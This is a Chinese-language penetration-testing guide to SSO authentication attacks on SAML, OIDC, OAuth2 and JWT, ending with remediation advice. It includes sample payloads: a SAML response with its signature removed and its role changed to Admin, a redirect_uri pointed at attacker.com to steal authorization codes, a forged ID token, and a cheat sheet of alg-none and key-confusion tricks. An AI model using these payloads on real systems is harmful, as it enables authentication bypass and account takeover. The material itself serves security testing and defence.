# **渗透测试方法论：SSO 认证攻击**

---

# **第一部分：文档概述**

## 1.1 编写目的
- 为渗透测试人员提供一套标准化、可复现的 SSO 认证安全测试与攻击流程
- 帮助测试人员识别 SSO/SAML/OIDC 实现中的安全缺陷
- 提高单点登录系统漏洞发现的准确率和效率

## 1.2 适用范围
- 适用于使用 SAML 2.0、OIDC、OAuth 2.0 等协议的企业 SSO 系统
- 适用于多租户 SaaS 应用的联邦认证场景
- 适用于任何使用单点登录机制的 Web 应用和 API

## 1.3 读者对象
- 本文件主要面向执行渗透测试任务的安全工程师、安全分析师
- 负责身份认证系统开发的开发人员
- 负责 IAM（身份访问管理）系统运维的技术人员

---

# **第二部分：核心渗透技术专题**

## 专题一：SSO 认证攻击

### 2.1 技术介绍

SSO（Single Sign-On，单点登录）认证攻击是指针对单点登录系统中 SAML、OIDC、OAuth 等联邦认证协议实现缺陷的攻击方式。其本质是**利用认证协议实现不当、配置错误或验证逻辑缺陷，绕过认证机制或冒充合法用户**。

常见 SSO 攻击类型：

| **攻击类型** | **攻击协议** | **攻击原理** | **风险等级** |
| :--- | :--- | :--- | :--- |
| SAML 签名绕过 | SAML 2.0 | 移除或篡改签名验证 | 严重 |
| SAML 断言篡改 | SAML 2.0 | 修改用户身份/权限属性 | 严重 |
| OIDC 重定向劫持 | OIDC/OAuth2 | 劫持授权码/令牌 | 高 |
| 令牌重放攻击 | OAuth2/OIDC | 重用已捕获的访问令牌 | 高 |
| 令牌替换攻击 | OAuth2/OIDC | 替换令牌中的声明 | 严重 |
| 证书混淆攻击 | SAML 2.0 | 利用多个证书的验证混乱 | 高 |

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **企业应用集成** | Salesforce、Office365、Slack 等企业应用 | SAML 配置不当导致认证绕过 |
| **云服务平台** | AWS、Azure、GCP 控制台登录 | IAM 角色映射配置错误 |
| **SaaS 多租户系统** | 多租户 SaaS 应用登录 | 租户隔离失效导致跨租户访问 |
| **移动应用登录** | 使用"通过 Google/微信登录" | OAuth 重定向 URI 验证不当 |
| **API 网关认证** | API 网关的 JWT/OIDC 验证 | 令牌验证逻辑缺陷 |
| **合作伙伴门户** | B2B 合作伙伴访问门户 | 联邦信任关系配置错误 |
| **客户身份管理** | CIAM 系统中的社交登录 | 第三方 IdP 信任配置不当 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

- **SAML 测试**
  - 拦截 SAML Response，分析断言结构
  - 尝试移除 Signature 元素，观察是否仍被接受
  - 尝试修改 Attribute 中的用户身份/角色
  - 尝试重放旧的 SAML Response
  - 测试签名算法降级（如从 RSA-SHA256 改为 None）

- **OIDC/OAuth2 测试**
  - 检查重定向 URI 是否可被篡改
  - 尝试修改 state 参数进行 CSRF 攻击
  - 尝试使用过期的访问令牌
  - 尝试修改 ID Token 中的 claims
  - 测试隐式流与授权码流的实现差异

- **JWT 测试**（如使用 JWT 作为令牌格式）
  - 尝试将算法改为 `none`
  - 尝试修改签名密钥
  - 尝试修改 payload 中的权限声明

#### 2.3.2 白盒测试

- **配置审计**
  - 检查 SAML IdP 和 SP 的配置
  - 审计 OIDC 客户端注册配置
  - 检查证书管理和轮换策略

- **代码审计**
  - 检查 SAML Response 验证逻辑
  - 审计令牌验证代码
  - 检查重定向 URI 验证逻辑
  - 查找硬编码的证书或密钥

### 2.4 漏洞利用方法

#### 2.4.1 SAML 签名绕过攻击

```xml
<!-- 原始 SAML Response -->
<samlp:Response>
  <ds:Signature>...</ds:Signature>
  <saml:Assertion>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>User</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>

<!-- 攻击：移除签名并修改权限 -->
<samlp:Response>
  <saml:Assertion>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>Admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

#### 2.4.2 OIDC 重定向劫持

```
# 正常授权请求
https://idp.example.com/authorize?
  client_id=app123&
  redirect_uri=https://app.example.com/callback&
  response_type=code&
  state=xyz

# 攻击：篡改重定向 URI
https://idp.example.com/authorize?
  client_id=app123&
  redirect_uri=https://attacker.com/steal&
  response_type=code&
  state=xyz
```

#### 2.4.3 令牌替换攻击

```json
// 原始 ID Token
{
  "sub": "user123",
  "email": "user@example.com",
  "role": "user",
  "iat": 1234567890,
  "exp": 1234571490
}

// 攻击：修改权限声明
{
  "sub": "admin",
  "email": "admin@example.com",
  "role": "admin",
  "iat": 1234567890,
  "exp": 1234571490
}
```

#### 2.4.4 基础信息收集

| **操作** | **方法** | **目的** |
| :--- | :--- | :--- |
| IdP 发现 | 查找 `.well-known/openid-configuration` | 获取 OIDC 配置端点 |
| SAML 元数据获取 | 获取 `/saml/metadata` | 分析 SAML 配置 |
| 证书提取 | 从元数据或响应中提取证书 | 用于离线分析 |
| 协议版本探测 | 检查支持的协议版本 | 寻找已知漏洞 |

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过签名验证

- **算法混淆** - 将签名算法改为 `none` 或对称算法
- **XML 签名包装攻击** - 在有效签名外包裹篡改内容
- **证书链绕过** - 利用证书验证逻辑缺陷
- **时间窗口利用** - 在证书轮换间隙使用旧证书

#### 2.5.2 绕过令牌验证

- **令牌重放** - 在令牌有效期内重复使用
- **令牌篡改** - 修改未签名的 claims
- **密钥混淆** - 利用公钥/私钥配置错误
- **JWKS 端点劫持** - 篡改密钥检索端点

#### 2.5.3 绕过重定向验证

- **URL 解析差异** - 利用不同解析器的差异
- **子域名绕过** - 使用 `https://attacker.example.com`（如果验证只检查域名后缀）
- **参数污染** - 使用多个 redirect_uri 参数
- **URL 编码绕过** - 使用特殊编码绕过过滤

---

# **第三部分：附录**

## 3.1 SSO 攻击 Payload 速查表

| **攻击类型** | **Payload/方法** | **适用场景** |
| :--- | :--- | :--- |
| **SAML 签名移除** | 删除 `<ds:Signature>` 节点 | 签名验证缺失 |
| **SAML 算法 None** | `Algorithm="http://www.w3.org/2000/09/xmldsig#none"` | 算法验证缺失 |
| **SAML 断言篡改** | 修改 `<saml:AttributeValue>` | 权限提升 |
| **OIDC 重定向劫持** | `redirect_uri=https://attacker.com` | 重定向验证不当 |
| **OIDC state 绕过** | 固定或预测 state 值 | CSRF 保护缺失 |
| **JWT 算法 None** | `{"alg":"none"}` | JWT 库漏洞 |
| **JWT 密钥混淆** | 使用公钥作为 HMAC 密钥 | 算法混淆漏洞 |
| **令牌重放** | 重放捕获的令牌 | 令牌撤销缺失 |

## 3.2 SSO 测试工具

| **工具名称** | **用途** | **命令示例** |
| :--- | :--- | :--- |
| **SAML Raider** | Burp 扩展，SAML 测试 | Burp Suite 插件 |
| **JWT.io** | JWT 解码/篡改 | 在线工具 |
| **jwt-tool** | JWT 攻击工具 | `python3 jwt_tool.py` |
| **Modlishka** | 反向代理钓鱼 | 用于凭证收割 |
| **SSOmap** | SAML 发现工具 | 自动化 SAML 端点发现 |
| **Burp Suite** | 拦截/修改 SSO 流量 | 手动测试 |

## 3.3 修复建议

1. **强制签名验证** - 始终验证 SAML/JWT 签名
2. **算法白名单** - 仅允许安全的签名算法
3. **重定向 URI 严格匹配** - 使用精确匹配而非前缀匹配
4. **State 参数验证** - 始终使用并验证 state 参数
5. **令牌有效期限制** - 设置合理的令牌过期时间
6. **令牌撤销机制** - 实现令牌撤销列表或短有效期
7. **证书轮换** - 定期轮换签名证书
8. **审计日志** - 记录所有认证事件用于审计
9. **多因素认证** - 对敏感操作要求额外认证
10. **最小权限原则** - 仅授予必要的权限范围
